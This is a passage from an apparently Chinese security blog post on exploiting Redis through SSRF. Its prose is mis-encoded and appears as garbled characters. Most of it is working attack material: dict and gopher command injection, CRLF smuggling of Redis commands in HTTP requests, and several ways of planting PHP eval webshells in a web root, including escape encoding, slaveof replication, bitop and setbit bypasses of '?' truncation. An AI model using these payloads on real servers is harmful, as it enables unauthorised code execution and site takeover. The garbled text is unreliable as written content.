<p>è¿™æ¡å‘½ä»¤æ˜¯å®¢æˆ·ç«¯æä¾›æœ‰å…³å…¶è‡ªèº«çš„ä¿¡æ¯ï¼Œä»¥ä¾¿è¿›è¡Œå¯èƒ½çš„æ—¥å¿—è®°å½•å’Œç»Ÿè®¡ã€‚è¿æ¥åˆ°æœåŠ¡å™¨åï¼Œæ‰€æœ‰å®¢æˆ·ç«¯éƒ½åº”å‘é€æ­¤å‘½ä»¤ã€‚æ ¹æ®è¿™é‡Œå¯ä»¥å‘ç°CLIENTå‘½ä»¤è²Œä¼¼æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p>è€Œç¬¬äºŒè¡Œæ˜¯<br>
cliä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬ä¸‰è¡Œæ˜¯dictåè®®å¸¦ä¸Šçš„QUITã€‚</p>
<p>ç”¨phpä¸­çš„curlçœ‹çœ‹æ˜¯ä»€ä¹ˆåŒ…ã€‚</p>
<pre><code>&lt;?php
   $ch = curl_init(); 
   curl_setopt($ch, CURLOPT_URL, &quot;dict://192.168.248.128:4444/set:1:123&quot;); 
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
   $output = curl_exec($ch); 
   echo $output;
   curl_close($ch);         
</code></pre>
<p>ç»“æœæ˜¯</p>
<pre><code>CLIENT libcurl 7.56.0
set 1 123
QUIT
</code></pre>
<p>å’Œå‘½ä»¤è¡Œçš„curlå®Œå…¨ä¸€æ ·ã€‚</p>
<p>çªç„¶æƒ³åˆ°å¦‚æœç”¨gopherå‘å‡ºè¿™ä¸ªåŒ…ä¼šå¦‚ä½•ã€‚å…ˆæµ‹è¯•</p>
<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:6379/_CLIENT%20libcurl%207.63.0%0D%0Aauth%20yuligesec%0A%0Dinfo%0D%0AQUIT&quot;
</code></pre>
<p>æ­£å¸¸è¿”å›infoä¿¡æ¯ã€‚<br>
è€Œå¦‚æœæŠŠCLIENTå»æ‰å‘¢ï¼Ÿ</p>
<pre><code>yulige@yulige-ubuntu:~$ curl &quot;gopher://0.0.0.0:6379/_auth%20yuligesec%0A%0Dinfo%0D%0AQUIT&quot;
</code></pre>
<p>ä¾ç„¶æ­£å¸¸è¿”å›ã€‚ä¹Ÿå°±æ˜¯è¯´ç¡®å®ç›´æ¥ç»™redisæœåŠ¡å™¨å‘commandä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æ­¤æ—¶æµ‹è¯•ç‰ˆæœ¬ä¸º<strong>3.0.6</strong>æ¢äº†ä¸€ä¸‹<strong>5.0.8</strong>ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ã€‚</p>
<h2 id="httpåè®®æ‰“redisprotocol-smuggleçš„æ€è€ƒ">httpåè®®æ‰“redisï¼ˆprotocol smuggleçš„æ€è€ƒï¼‰</h2>
<p>æ—¢ç„¶ç›´æ¥å‘commandä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé‚£å²‚ä¸æ˜¯åœ¨httpåè®®ä¸­çš„è¯·æ±‚åŒ…é‡Œé¢åŒ…å«commandä¹Ÿå¯ä»¥å‘¢ã€‚</p>
<p>åœ¨<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">ã€Šã€Blackhatã€‘SSRFçš„æ–°çºªå…ƒï¼šåœ¨ç¼–ç¨‹è¯­è¨€ä¸­åˆ©ç”¨URLè§£æå™¨ã€‹</a> ä¸­orangeæœ‰æåˆ°åˆ©ç”¨httpåè®®ä¸­çš„crlfæ¥å‘é€rediscommandçš„æ¡ˆä¾‹ï¼Œä»¥åŠæåˆ°äº†ä¸€ä¸ªnodejsä¸­è¿‡æ»¤äº†crlfä½†æ˜¯ä¾ç„¶å¯ä»¥ä½¿ç”¨<code>http://127.0.0.1:6379/ -SLAVEOF @orange.tw@ 6379-</code>ä»ç„¶èƒ½å¤Ÿè¿›è¡Œprotocol smuggleã€‚</p>
<p>ç„¶åè‡ªå·±è¯•ç€æ„é€ äº†ä¸€ä¸ªhttpè¯·æ±‚åŒ…ç„¶åç”¨ncå‘é€ï¼Œå‘ç°æ— è®ºæ€ä¹ˆæ„é€ éƒ½æ— æ³•è·å–è¿”å›åŒ…ï¼ˆè¿·æƒ‘ï¼Ÿå•¥æƒ…å†µï¼Œæ˜æ˜åŒ…éƒ½ä¸€æ¨¡ä¸€æ ·äº†ï¼‰</p>
<p>ç”¨curl</p>
<pre><code>yulige@yulige-ubuntu:~$ curl -v &quot;http://0.0.0.0:6378/&quot;
*   Trying 0.0.0.0...
* TCP_NODELAY set
* Connected to 0.0.0.0 (127.0.0.1) port 6378 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 0.0.0.0:6378
&gt; User-Agent: curl/7.63.0
&gt; Accept: */*
&gt;
-ERR wrong number of arguments for 'get' command
* Closing connection 0

---------------------------------------------
&gt; 2020/05/24 11:16:59.054108  length=76 from=0 to=75
GET / HTTP/1.1\r
Host: 0.0.0.0:6378\r
User-Agent: curl/7.63.0\r
Accept: */*\r
\r
&lt; 2020/05/24 11:16:59.054534  length=50 from=0 to=49
-ERR wrong number of arguments for 'get' command\r
</code></pre>
<p>ç”¨nc</p>
<pre><code>yulige@yulige-ubuntu:~$ cat httprequest | nc 127.0.0.1 6378
yulige@yulige-ubuntu:~$

------------------------------------------------
&gt; 2020/05/24 11:20:10.739862  length=78 from=0 to=77
GET / HTTP/1.1\r
Host: 127.0.0.1:6378\r
User-Agent: curl/7.63.0\r
Accept: */*\r
\r

</code></pre>
<p>è‚‰çœ¼çœ‹èµ·æ¥ æ•°æ®åŒ…ä¸€æ¨¡ä¸€æ ·äº†ï¼Œä½†æ˜¯ncå‘é€å‡ºå»çš„æ²¡æœ‰å“åº”åŒ…ï¼Œä¸Šç½‘æŸ¥äº†ä¸€ä¸‹èµ„æ–™å‘ç°åº”è¯¥è¿™æ ·å»å‘é€æ–‡ä»¶å†…å®¹ã€‚</p>
<pre><code>nc 127.0.0.1 6378 &lt;httprequest
</code></pre>
<p>ç„¶åå‘ç° æ—¶çµæ—¶ä¸çµï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Œæœ‰æ—¶å€™èƒ½æ”¶åˆ°è¿”å›åŒ…æœ‰æ—¶å€™æ”¶ä¸åˆ°ã€‚</p>
<pre><code>yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
-ERR wrong number of arguments for 'get' command
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
-ERR wrong number of arguments for 'get' command
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
-ERR wrong number of arguments for 'get' command
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
-ERR wrong number of arguments for 'get' command
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
yulige@yulige-ubuntu:~$ nc 127.0.0.1 6378 &lt; httprequest
-ERR wrong number of arguments for 'get' command

</code></pre>
<p>æˆ‘ç›´æ¥å°±ä¸€ä¸ªå¤§é—®å·?å•¥æƒ…å†µå•Š...å¸Œæœ›æœ‰å¸ˆå‚…æŒ‡ç‚¹ä¸€ä¸‹ï¼Œå·²ç»è¶…å‡ºäº†æˆ‘çš„çŸ¥è¯†èŒƒå›´ã€‚<br>
ç„¶åå†ç”¨ncå‘é€æˆåŠŸä¸€æ¬¡æ•°æ®åŒ…çœ‹çœ‹</p>
<pre><code>yulige@yulige-ubuntu:~$ cat httprequest
GET / HTTP/1.1
Host: 127.0.0.1:6378
set 133 123
User-Agent: curl/7.63.0
Accept: */*

------------------------------------------------
&gt; 2020/05/24 11:44:54.783301  length=91 from=0 to=90
GET / HTTP/1.1\r
Host: 127.0.0.1:6378\r
set 133 123\r
User-Agent: curl/7.63.0\r
Accept: */*\r
\r
&lt; 2020/05/24 11:44:54.783573  length=50 from=0 to=49
-ERR wrong number of arguments for 'get' command\r
</code></pre>
<p>ç„¶åredisçœ‹123è¿™ä¸ªé”®æ˜¯å¦å­˜åœ¨ï¼Œå‘ç°å¹¶æ²¡æœ‰ã€‚ã€‚</p>
<p>ç„¶åå°è¯•ä½¿ç”¨ä¸€ä¸ªå­˜åœ¨crlfçš„å‘é€httpè¯·æ±‚çš„pythonæ¨¡å—æ¥æµ‹è¯•å§ã€‚</p>
<p>æ¨èä¸€ä¸ªè·‘fuzzçš„é¡¹ç›®<br>
https://github.com/orangetw/Tiny-URL-Fuzzer</p>
<p>å‚è€ƒï¼šhttps://blog.csdn.net/qq_40989258/article/details/104735997</p>
<pre><code class="language-python">import urllib2
url = &quot;http://127.0.0.1:6378?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123:6378/test/?test=a&quot;
htmlpage = urllib2.urlopen(url).read()
print htmlpage
</code></pre>
<p>æŠ“åŒ…</p>
<pre><code>&gt; 2020/05/24 11:59:47.666102  length=181 from=0 to=180
GET /?a=1 HTTP/1.1\r
CRLF-injection: test\r
TEST: 123:6378/test/?test=a HTTP/1.1\r
Accept-Encoding: identity\r
Host: 127.0.0.1:6378\r
Connection: close\r
User-Agent: Python-urllib/2.7\r
\r
&lt; 2020/05/24 11:59:47.668209  length=161 from=0 to=160
-ERR wrong number of arguments for 'get' command\r
-ERR unknown command 'CRLF-injection:'\r
-ERR unknown command 'TEST:'\r
-ERR unknown command 'Accept-Encoding:'\r
</code></pre>
<p>æ•ˆæœè¿˜ä¸é”™ï¼Œæµ‹è¯•å†™å…¥ä¸€ä¸ªkeyè¯•è¯•ã€‚</p>
<pre><code>yulige@yulige-ubuntu:~$ cat testrediscrlf.py
import urllib2
url = &quot;http://127.0.0.1:6378?a=1 HTTP/1.1\r\nset 1234 123\r\ntest: 123&quot;
htmlpage = urllib2.urlopen(url).read()
print htmlpage
----------------------------------
&gt; 2020/05/24 12:27:42.221136  length=155 from=0 to=154
GET /?a=1 HTTP/1.1\r
set 1234 123\r
test: 123 HTTP/1.1\r
Accept-Encoding: identity\r
Host: 127.0.0.1:6378\r
Connection: close\r
User-Agent: Python-urllib/2.7\r
\r
&lt; 2020/05/24 12:27:42.232387  length=126 from=0 to=125
-ERR wrong number of arguments for 'get' command\r
+OK\r
-ERR unknown command 'test:'\r
-ERR unknown command 'Accept-Encoding:'\r
----------------------------
127.0.0.1:6379&gt; keys *
1) &quot;1234&quot;
127.0.0.1:6379&gt; get 1234
&quot;123&quot;

</code></pre>
<p>ç¡®å®æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºä»dictåè®®ä¸­è·å¾—çš„æ€è·¯ï¼Œä¸€è¡Œcommandå°±èƒ½å‘é€è¿‡å»ï¼Œä¸éœ€è¦è½¬æ¢ä¸ºrespæ ¼å¼ã€‚<br>
<strong>æ‰€ä»¥å¦‚æœé™åˆ¶äº†åè®®ç±»å‹ä¸ºhttpæˆ–è€…å…¶ä»–çš„ssrfï¼Œä¾ç„¶å¯ä»¥ç”¨è¿™ä¸ªæ€è·¯å»æ”»å‡»redisã€‚åªéœ€è¦ä¸€ä¸ªcrlfå³å¯ã€‚</strong></p>
<h1 id="å†™webshell">å†™webshell</h1>
<h2 id="redis-cliå†™webshell">redis-cliå†™webshell</h2>
<p>è‹¥rediså¼€æ”¾ç«¯å£å¹¶å…è®¸å¤–è¿,å‚è€ƒhttps://daolgts.github.io/2019/10/10/redis%20rce/</p>
<p><code>redis3.2ç‰ˆæœ¬åæ–°å¢ protected-mode é…ç½®ï¼Œé»˜è®¤æ˜¯ yesï¼Œå³å¼€å¯,å¤–éƒ¨ç½‘ç»œæ— æ³•è¿æ¥ redis æœåŠ¡</code><br>
æˆ‘ubuntuæœ¬åœ°å®‰è£…çš„3.0.8,é»˜è®¤æœ‰<code>bind 127.0.0.1</code>çš„é…ç½®ï¼Œç¦æ­¢å¤–è¿ã€‚<br>
æ‰¾ä¸€ä¸ªèƒ½å†™çš„ç›®å½•,åˆ©ç”¨æ•°æ®åº“å¤‡ä»½åŠŸèƒ½getshellã€‚</p>
<pre><code>127.0.0.1:6379&gt; config set dir /var/www/html
OK
127.0.0.1:6379&gt; config set dbfilename shell.php
OK
127.0.0.1:6379&gt; set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
OK
127.0.0.1:6379&gt; save
</code></pre>
<p>çœ‹ä¸€ä¸‹shell.phpçš„å†…å®¹</p>
<pre><code>REDIS0006webshell&lt;?php @eval($_POST[1]);?&gt;â–’â–’Iâ–’sâ–’.;â–’
</code></pre>
<h2 id="ssrfå†™webshell">ssrfå†™webshell</h2>
<h3 id="ç›´æ¥å†™å…¥å¤±è´¥">ç›´æ¥å†™å…¥(å¤±è´¥)</h3>
<p>å¦‚æœæ˜¯ssrfå‘¢ã€‚</p>
<pre><code>root@yulige-ubuntu:/# curl -g  'dict://0.0.0.0:6379/set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;'
</code></pre>
<p>æ”¶åˆ°çš„å´æ˜¯ä»¥ä¸‹å†…å®¹ã€‚è²Œä¼¼æ˜¯<code>?</code>è¿™é‡Œæˆªæ–­æ‰äº†ã€‚</p>
<pre><code>CLIENT libcurl 7.47.0
set webshell '&lt;
QUIT
</code></pre>
<p>urlç¼–ç çœ‹çœ‹,æ”¶åˆ°çš„å´æ˜¯</p>
<pre><code>CLIENT libcurl 7.47.0
set%20webshell%20%22%3C%3Fphp%20%40eval(%24_POST%5B1%5D)%3B%3F%3E%22
QUIT
</code></pre>
<p>çœ‹èµ·æ¥å¹¶ä¸èƒ½urlç¼–ç ã€‚</p>
<p>ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹èµ„æ–™å¹¶ç»“åˆè‡ªå·±æµ‹è¯•ï¼Œ<br>
<code>?</code>ä¹‹åçš„å†…å®¹éƒ½æ²¡æ³•è·å–åˆ°ã€‚é‚£ä¹ˆå¦‚ä½•å»ç»•è¿‡å‘¢ã€‚</p>
<h3 id="è½¬ä¹‰ç»•è¿‡æˆªæ–­">è½¬ä¹‰ç»•è¿‡?æˆªæ–­</h3>
<p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">dvpwriteup</a>æ›¾ç»åœ¨ä¸€ä¸ªctfä¸­å‡ºç°è¿‡ç”¨è½¬ä¹‰ç¼–ç å»ç»•è¿‡çš„</p>
<blockquote>
<p>å†™å…¥æ¶æ„ä»£ç ï¼šï¼ˆ&lt;? ç­‰ç‰¹æ®Šç¬¦å·éœ€è¦è½¬ä¹‰ï¼Œä¸ç„¶é—®å·åé¢ä¼šå¯¼è‡´æˆªæ–­æ— æ³•å†™å…¥ï¼‰<br>
dict://0:6379/setğŸš&quot;\x3C\x3Fphp\x20echo<code>$_GET[x]</code>\x3B\x3F\x3E&quot;</p>
</blockquote>
<p>å…ˆç›´æ¥æ‹¿ä¸Šé¢è¿™ä¸ªçš„payloadåšæµ‹è¯•ï¼š</p>
<pre><code>CLIENT libcurl 7.47.0
set shell &quot;\x3C\x3Fphp\x20echo`$_GET[x]`\x3B\x3F\x3E&quot;
QUIT
</code></pre>
<p>cliè¿ä¸Šå»çœ‹çœ‹ã€‚</p>
<pre><code>127.0.0.1:6379&gt; get shell
&quot;&lt;?php echo`$_GET[x]`;?&gt;&quot;
</code></pre>
<p>æˆåŠŸå†™å…¥ã€‚æ­¤æ—¶æµ‹è¯•ç‰ˆæœ¬ä¸º<strong>3.0.6</strong>æ¢äº†ä¸€ä¸‹<strong>5.0.8</strong>åŒæ ·å†™å…¥æˆåŠŸã€‚</p>
<p>å†™å…¥æ–‡ä»¶ä¹‹åä¹ŸåŒæ ·æ˜¯æ­£å¸¸çš„webshellã€‚</p>
<h3 id="ä¸»ä»å¤åˆ¶ç»•è¿‡æˆªæ–­">ä¸»ä»å¤åˆ¶ç»•è¿‡?æˆªæ–­</h3>
<p>å½“<code>ï¼Ÿ</code>æˆªæ–­çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸»ä»å¤åˆ¶çš„æ–¹æ³•å°†keyå€¼ä»ä¸»èŠ‚ç‚¹å¤åˆ¶è¿‡æ¥ã€‚ç„¶åèŠ‚ç‚¹å†æ‰§è¡Œå¤‡ä»½æ•°æ®åº“æ“ä½œå†™å…¥webshellã€‚</p>
<p>ä¸»èŠ‚ç‚¹</p>
<pre><code>127.0.0.1:4444&gt; set shell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
OK
</code></pre>
<p>èŠ‚ç‚¹</p>
<pre><code>dict://0:6379/slaveof:127.0.0.1:4444
dict://0:6379/config:set:dir:/var/www/html
dict://0:6379/config:set:dbfilename:shell.php
dict://0:6379/save
dict://0:6379/slaveof:no:one
</code></pre>
<p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æ˜¯æˆåŠŸå†™å…¥shelläº†ã€‚</p>
<p><strong>å½“ç„¶äº†å¦‚æœå¯ä»¥å‡ºå¤–ç½‘ä¹Ÿå¯ä»¥ç›´æ¥ä¸»ä»å¤åˆ¶rceï¼Œè¿™ä¸€ç‚¹åœ¨å‰é¢å°±è¯´è¿‡äº†ã€‚åªè¦ç”¨pythonèµ·ä¸€ä¸ªæœåŠ¡å»æ¨¡æ‹Ÿredisçš„è¿”å›ï¼Œå¹¶ä¸”åœ¨å…¨é‡å¤åˆ¶çš„æ—¶å€™æŠŠæ•°æ®åº“æ–‡ä»¶æ›¿æ¢æˆsoæ–‡ä»¶å³å¯ã€‚</strong></p>
<h3 id="bitopå‘½ä»¤ç»•è¿‡æˆªæ–­">bitopå‘½ä»¤ç»•è¿‡?æˆªæ–­</h3>
<p>å‰æ®µæ—¶é—´<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">[zer0pts CTF 2020] urlapp</a>å‡ºäº†ä¸€é“è€ƒbitopå‘½ä»¤çš„é¢˜ã€‚<br>
<img src="https://p0.ssl.qhimg.com/dm/1024_203_/t01115b0d3e34d2e976.png" alt="" loading="lazy"><br>
å¯ä»¥å°†keyåšä½è¿ç®—æ“ä½œå¹¶å­˜å‚¨åœ¨æ–°çš„keyä¸­ã€‚</p>
<p>è€Œåœ¨<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247483865&amp;idx=1&amp;sn=41e56040229e383a82a671fc359ee82b&amp;chksm=f9ee6d66ce99e470d102becfcf63955f2aae1d88bc43ef8e7939bc93d786ff2f994eac969d32&amp;scene=126&amp;sessionid=1586255695&amp;key=c00e1a5b49adb240be940797e7d3cb821bae9b89771be268faa858b2888bbba3e96562ccac53df81389cb41e548a9e6412d4f83b6b7b541825630aa6ace9d1d040a3b7cd677b5ca137cc9b1d2297948e&amp;ascene=1&amp;uin=MzE0MDM4MzExMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A6a52QI1M4H5IGXp8ekqTtY%3D&amp;pass_ticket=awXcPg%2FApqlfbrG8njT11ZZYAGjwbhrnExtbvARh%2F%2FrtbsupQLnZBKBPE6SCXvhn">ä¸€æ¬¡â€œSSRF--&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨</a>ä¸­ï¼Œå°±æ˜¯ç”¨bitopå»ç»•è¿‡çš„<code>\x00</code></p>
<pre><code>dict://0:6379/set:shell:&quot;\xc3\xc0\x8f\x97\x8f\xdf\xbf\x9a\x89\x9e\x93\xd7\xdb\xa0\xaf\xb0\xac\xab\xa4\xce\xa2\xd6\xc4\xc0\xc1&quot;
dict://0:6379/bitop:not:shell:shell
</code></pre>
<pre><code>127.0.0.1:6379&gt; get shell
&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
</code></pre>
<p>è€Œåœ¨<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&amp;mid=2247483865&amp;idx=1&amp;sn=41e56040229e383a82a671fc359ee82b&amp;chksm=f9ee6d66ce99e470d102becfcf63955f2aae1d88bc43ef8e7939bc93d786ff2f994eac969d32&amp;scene=126&amp;sessionid=1586255695&amp;key=c00e1a5b49adb240be940797e7d3cb821bae9b89771be268faa858b2888bbba3e96562ccac53df81389cb41e548a9e6412d4f83b6b7b541825630aa6ace9d1d040a3b7cd677b5ca137cc9b1d2297948e&amp;ascene=1&amp;uin=MzE0MDM4MzExMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080079&amp;lang=zh_CN&amp;exportkey=A6a52QI1M4H5IGXp8ekqTtY%3D&amp;pass_ticket=awXcPg%2FApqlfbrG8njT11ZZYAGjwbhrnExtbvARh%2F%2FrtbsupQLnZBKBPE6SCXvhn">ä¸€æ¬¡â€œSSRF--&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨</a>ä¸­æœ«å°¾æœ‰æåˆ°å¯ä»¥ç”¨<code>bitfield</code>ï¼Œè¿™ä¸ªçš„è¯å’Œ<code>bitop</code>,<code>bitos</code>æ˜¯ä¸€ä¸ªç³»åˆ—çš„commandï¼Œhttps://blog.csdn.net/qq_34206560/article/details/90722401ï¼Œbitfieldå‘½ä»¤å¯ä»¥å°†ä¸€ä¸ªrediså­—ç¬¦ä¸²çœ‹åšæ˜¯ä¸€ä¸ªç”±äºŒè¿›åˆ¶ä½ç»„æˆçš„æ•°ç»„ï¼Œå¹¶å¯¹è¿™ä¸ªæ•°ç»„ä¸­å‚¨å­˜çš„é•¿åº¦<br>
ä¸åŒçš„æ•´æ•°è¿›è¡Œè®¿é—®(è¢«å‚¨å­˜çš„æ•´æ•°æ— éœ€å¯¹é½)ã€‚å’Œbitopç›¸æ¯”ä½¿ç”¨å¤æ‚å¾ˆå¤šï¼Œè¿™é‡Œä¸å†å¤ç°ã€‚</p>
<h3 id="setbitå‘½ä»¤ç»•è¿‡æˆªæ–­">setbitå‘½ä»¤ç»•è¿‡?æˆªæ–­</h3>
<p>æ—¢ç„¶æƒ³æ˜ç™½å…³é”®æ˜¯?æˆªæ–­çš„è¯å…¶å®æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œèƒ½æ“ä½œkeyå°±å¯ä»¥ã€‚è¿™é‡Œä¸¾å‡ºä¸€ä¸ªcommand setbit.</p>
<p>https://www.runoob.com/redis/strings-setbit.html</p>
<p>Redis Setbit å‘½ä»¤ç”¨äºå¯¹ key æ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ï¼Œè®¾ç½®æˆ–æ¸…é™¤æŒ‡å®šåç§»é‡ä¸Šçš„ä½(bit)ã€‚</p>
<p><code>?</code>çš„asciiæ˜¯63ï¼Œascii62æ˜¯<code>&gt;</code>ï¼ŒäºŒè¿›åˆ¶åˆ†åˆ«æ˜¯<code>0b00011111</code>å’Œ<code>0b00011110</code>ã€‚æ‰€ä»¥æŒ‰ç…§å‰é¢çš„payloadç¨å¾®æ”¹ä¸€ä¸‹å°±æ˜¯.ä½¿ç”¨setbitæ”¹åŠ¨ä¸€ä½äºŒè¿›åˆ¶å³å¯æŠŠå­—ç¬¦å˜æˆ<code>?</code>ï¼Œä»è€Œå¯å†™å…¥webshellã€‚</p>
<pre><code>127.0.0.1:6379&gt; config set dir /var/www/html
OK
127.0.0.1:6379&gt; config set dbfilename shell.php
OK
127.0.0.1:6379&gt; set webshell &quot;&lt;&gt;php @eval($_POST[1]);&gt;&gt;&quot;
OK
127.0.0.1:6379&gt; setbit webshell 191 1
(integer) 0
127.0.0.1:6379&gt; setbit webshell 15 1
(integer) 0
127.0.0.1:6379&gt; save
OK
</code></pre>
<h1 id="åçºª">åçºª</h1>
<p>å…¶å®æ–‡ç« ä¸­å‡ ä¸ªæ¯”è¾ƒæ–°çš„ç‚¹éƒ½æ²¡å¤ªå¤šæŠ€æœ¯å«é‡ï¼Œä½†æ˜¯å´é²œæœ‰äººæåˆ°æˆ–è€…æå‡ºï¼Œè¿™ä¹Ÿæ˜¯æˆ‘æ¯”è¾ƒå¥‡æ€ªçš„ä¸€ä¸ªç‚¹ã€‚å¿—è¶£ç›¸æŠ•è€…ï¼Œå¸Œæœ›èƒ½å…±åŒæ¢è®¨æŠ€æœ¯ï¼</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E5%9F%BA%E7%A1%80">åŸºç¡€</a>
<ul>
<li><a href="#redis%E8%BF%9E%E6%8E%A5%E5%91%BD%E4%BB%A4">redisè¿æ¥å‘½ä»¤</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%AE%E5%80%BC%E5%AF%B9">è®¾ç½®é”®å€¼å¯¹:</a></li>
<li><a href="#%E5%8F%96%E5%87%BA%E9%94%AE%E5%80%BC%E5%AF%B9">å–å‡ºé”®å€¼å¯¹:</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E9%85%8D%E7%BD%AE">è·å–é…ç½®</a></li>
<li><a href="#%E7%BC%96%E8%BE%91%E9%85%8D%E7%BD%AE">ç¼–è¾‘é…ç½®</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">æ•°æ®ç±»å‹</a></li>
<li><a href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE">æœåŠ¡å™¨é…ç½®</a></li>
<li><a href="#%E8%AE%A4%E8%AF%81">è®¤è¯</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD">æ•°æ®åº“å¤‡ä»½</a></li>
<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">ä¸»ä»å¤åˆ¶</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93">åŠ è½½åŠ¨æ€é“¾æ¥åº“</a>
<ul>
<li><a href="#rce">rce</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dict%E5%8D%8F%E8%AE%AE%E5%92%8Cgopher%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BBredis">dictåè®®å’Œgopheråè®®æ”»å‡»redis</a>
<ul>
<li><a href="#gopher">gopher</a></li>
<li><a href="#dict">dict</a></li>
<li><a href="#http%E5%8D%8F%E8%AE%AE%E6%89%93redisprotocol-smuggle%E7%9A%84%E6%80%9D%E8%80%83">httpåè®®æ‰“redisï¼ˆprotocol smuggleçš„æ€è€ƒï¼‰</a></li>
</ul>
</li>
<li><a href="#%E5%86%99webshell">å†™webshell</a>
<ul>
<li><a href="#redis-cli%E5%86%99webshell">redis-cliå†™webshell</a></li>
<li><a href="#ssrf%E5%86%99webshell">ssrfå†™webshell</a>
<ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E5%A4%B1%E8%B4%A5">ç›´æ¥å†™å…¥(å¤±è´¥)</a></li>
<li><a href="#%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">è½¬ä¹‰ç»•è¿‡?æˆªæ–­</a></li>
<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">ä¸»ä»å¤åˆ¶ç»•è¿‡?æˆªæ–­</a></li>
<li><a href="#bitop%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">bitopå‘½ä»¤ç»•è¿‡?æˆªæ–­</a></li>
<li><a href="#setbit%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E6%88%AA%E6%96%AD">setbitå‘½ä»¤ç»•è¿‡?æˆªæ–­</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%90%8E%E7%BA%AA">åçºª</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://blog.xray.cool/post/from-information-leak-to-rce/">
              <h3 class="post-title">
                è®°ä¸€æ¬¡ä»ä¿¡æ¯æ³„æ¼åˆ°RCE
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
